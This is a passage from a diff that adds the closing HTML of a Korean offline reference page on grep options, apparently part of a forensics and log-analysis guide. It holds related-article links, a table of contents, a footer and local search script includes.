+  <a class="related-item" href="./grep-e-regex.html">
+    <span class="rel-id">FOR-0113 · 로그/Regex</span>
+    grep -E 확장 정규표현식(ERE) 실전: BRE와의 차이와 lookaround 대안
+  </a>
+  <a class="related-item" href="./ripgrep.html">
+    <span class="rel-id">FOR-0114 · 로그/Regex</span>
+    ripgrep(rg) 옵션 레퍼런스: grep과 다른 기본값과 -P -z -u 활용
+  </a>
+  <a class="related-item" href="./powershell-select-string.html">
+    <span class="rel-id">FOR-0121 · 로그/Regex</span>
+    PowerShell Select-String으로 로그 검색하기 (Windows용 grep)
+  </a>
+  <a class="related-item" href="./ipv4-regex.html">
+    <span class="rel-id">FOR-0128 · 로그/Regex</span>
+    IPv4 주소 regex: 느슨한 패턴과 엄격한 패턴 골라 쓰기
+  </a>
+  </div>
+</section>
+      <div class="pager">
+<a class="related-item" href="./log-triage.html"><span class="rel-id">← FOR-0111</span>로그 파일 30초 트리아지: 형식·줄수·시간범위부터 확인한다</a>
+<a class="related-item" href="./grep-e-regex.html"><span class="rel-id">FOR-0113 →</span>grep -E 확장 정규표현식(ERE) 실전: BRE와의 차이와 lookaround 대안</a>
+      </div>
+    </article>
+<aside class="toc">
+  <div class="toc-title">목차</div>
+  <ul>
+<li class="toc-l2"><a href="#한-줄-결론">한 줄 결론</a></li>
+<li class="toc-l2"><a href="#개념">개념</a></li>
+<li class="toc-l2"><a href="#파일-경로">파일 / 경로</a></li>
+<li class="toc-l2"><a href="#주요-필드">주요 필드</a></li>
+<li class="toc-l3"><a href="#출력을-바꾸는-옵션">출력을 바꾸는 옵션</a></li>
+<li class="toc-l3"><a href="#매칭-범위를-바꾸는-옵션">매칭 범위를 바꾸는 옵션</a></li>
+<li class="toc-l3"><a href="#문맥을-함께-보는-옵션">문맥을 함께 보는 옵션</a></li>
+<li class="toc-l3"><a href="#재귀와-파일-선택">재귀와 파일 선택</a></li>
+<li class="toc-l3"><a href="#바이너리-데이터-처리">바이너리 데이터 처리</a></li>
+<li class="toc-l3"><a href="#종료-코드">종료 코드</a></li>
+<li class="toc-l2"><a href="#빠른-명령">빠른 명령</a></li>
+<li class="toc-l2"><a href="#함께-보는-artifact">함께 보는 artifact</a></li>
+<li class="toc-l2"><a href="#흔한-실수">흔한 실수</a></li>
+<li class="toc-l2"><a href="#mini-example">mini example</a></li>
+<li class="toc-l2"><a href="#출처">출처</a></li>
+  </ul>
+</aside>
+  </div>
+</main>
+<footer class="site-footer">
+  완전 오프라인 · 인터넷/CDN 없음 · build 2026-09-10 08:40 KST
+</footer>
+<script src="../assets/search-index.js"></script>
+<script src="../assets/search-core.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
